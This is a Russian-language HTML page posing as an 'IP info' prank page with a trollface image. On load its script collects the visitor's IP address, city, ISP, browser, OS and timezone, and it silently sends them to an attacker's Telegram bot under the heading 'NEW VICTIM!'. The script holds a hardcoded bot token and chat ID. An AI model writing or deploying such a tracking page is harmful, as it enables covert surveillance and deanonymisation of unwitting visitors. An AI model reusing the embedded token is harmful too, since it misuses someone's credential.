<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP Информация</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 90%;
        }
        h1 {
            text-align: center;
            color: #4a4a4a;
            margin-bottom: 30px;
            font-size: 2em;
        }
        .info-block {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .info-block p {
            margin: 8px 0;
            padding: 8px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }
        .info-block p:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #764ba2;
        }
        .loading {
            text-align: center;
            color: #666;
        }
        .troll-image {
            width: 100px;
            display: block;
            margin: 20px auto 0;
            animation: float 3s ease-in-out infinite;
            cursor: pointer;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Информация</h1>
        <div id="info" class="info-block">
            <p class="loading">Загрузка данных...</p>
        </div>
        <img src="trollface.png" alt="Trollface" class="troll-image" id="trollImage">
    </div>

    <script>
        // =============================================
        // НАСТРОЙКИ - ТВОИ ДАННЫЕ
        // =============================================
        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
        const chatId = '1238755996';
        
        // =============================================
        // ПОЛУЧЕНИЕ ДАННЫХ О БРАУЗЕРЕ
        // =============================================
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Неизвестно";
            let os = "Неизвестно";
            
            // Определяем браузер
            if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
            else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
            else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
            else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";
            
            // Определяем ОС
            if (ua.indexOf("Windows NT 10.0") > -1) os = "Windows 10/11";
            else if (ua.indexOf("Windows NT 6.2") > -1) os = "Windows 8";
            else if (ua.indexOf("Windows NT 6.1") > -1) os = "Windows 7";
            else if (ua.indexOf("Mac OS X") > -1) os = "macOS";
            else if (ua.indexOf("iPhone") > -1) os = "iOS (iPhone)";
            else if (ua.indexOf("iPad") > -1) os = "iOS (iPad)";
            else if (ua.indexOf("Android") > -1) os = "Android";
            else if (ua.indexOf("Linux") > -1) os = "Linux";
            
            return { browser, os };
        }
        
        // =============================================
        // ПОЛУЧЕНИЕ IP И ГЕО-ДАННЫХ
        // =============================================
        async function getIpInfo() {
            try {
                // Пробуем разные API
                const apis = [
                    'https://api.myip.com/',
                    'https://ip.nf/me.json',
                    'https://ipapi.co/json/'
                ];
                
                for (let api of apis) {
                    try {
                        const response = await fetch(api);
                        const data = await response.json();
                        
                        if (data.ip) {
                            return {
                                ip: data.ip,
                                country: data.country || data.country_name || 'Неизвестно',
                                city: data.city || 'Неизвестно',
                                region: data.region || 'Неизвестно',
                                isp: data.org || data.isp || data.organisation || 'Неизвестно'
                            };
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                // Если ничего не сработало, пробуем через прокси
                const proxyResponse = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipapi.co/json/'));
                const wrapper = await proxyResponse.json();
                const data = JSON.parse(wrapper.contents);
                
                return {
                    ip: data.ip,
                    country: data.country_name || 'Неизвестно',
                    city: data.city || 'Неизвестно',
                    region: data.region || 'Неизвестно',
                    isp: data.org || 'Неизвестно'
                };
            } catch (error) {
                console.error('Ошибка:', error);
                return null;
            }
        }
        
        // =============================================
        // ОТПРАВКА В TELEGRAM (МАКСИМУМ ИНФЫ)
        // =============================================
        async function sendToTelegram(ipData, browserInfo) {
            const now = new Date();
            const timeStr = now.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            
            // Определяем время у пользователя (часовой пояс браузера)
            const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const userTime = new Date().toLocaleString('ru-RU', { timeZone: userTimezone });
            
            // Тип устройства
            let deviceType = "Компьютер";
            if (navigator.userAgent.match(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i)) {
                deviceType = "Мобильное устройство";
            }
            
            // Собираем сообщение
            const message = `🔥 <b>НОВАЯ ЖЕРТВА!</b> 🔥

📍 <b>IP:</b> ${ipData.ip}
🌍 <b>Страна:</b> ${ipData.country}
🏙️ <b>Город:</b> ${ipData.city}
🗺️ <b>Регион:</b> ${ipData.region}
📡 <b>Провайдер:</b> ${ipData.isp}

💻 <b>Браузер:</b> ${browserInfo.browser}
📱 <b>ОС:</b> ${browserInfo.os}
📟 <b>Тип:</b> ${deviceType}
🕐 <b>Часовой пояс:</b> ${userTimezone}

⏰ <b>Его время:</b> ${userTime}
🤖 <b>Время розыгрыша:</b> ${timeStr}

🕵️ <b>User Agent:</b> 
<code>${navigator.userAgent.substring(0, 100)}...</code>`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('Отправлено в Telegram');
            } catch (error) {
                console.error('Ошибка отправки:', error);
            }
        }
        
        // =============================================
        // ПОКАЗ НА СТРАНИЦЕ
        // =============================================
        async function showInfo() {
            const infoDiv = document.getElementById('info');
            infoDiv.innerHTML = '<p class="loading">Собираю данные...</p>';
            
            const ipData = await getIpInfo();
            const browserInfo = getBrowserInfo();
            
            if (ipData && ipData.ip) {
                // Показываем на странице
                infoDiv.innerHTML = `
                    <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
                    <p><span class="label">Страна:</span> <span>${ipData.country}</span></p>
                    <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
                    <p><span class="label">Провайдер:</span> <span>${ipData.isp}</span></p>
                    <p><span class="label">Браузер:</span> <span>${browserInfo.browser}</span></p>
                    <p><span class="label">ОС:</span> <span>${browserInfo.os}</span></p>
                    <p><span class="label">Часовой пояс:</span> <span>${Intl.DateTimeFormat().resolvedOptions().timeZone}</span></p>
                `;
                
                // Отправляем в Telegram
                await sendToTelegram(ipData, browserInfo);
            } else {
                infoDiv.innerHTML = '<p class="loading">Не удалось получить данные</p>';
            }
        }
        
        // Клик по картинке
        document.getElementById('trollImage').addEventListener('click', function() {
            alert('🔍 Обновляю данные...');
            showInfo();
        });
        
        // Запуск при загрузке
        showInfo();
    </script>
</body>
</html>
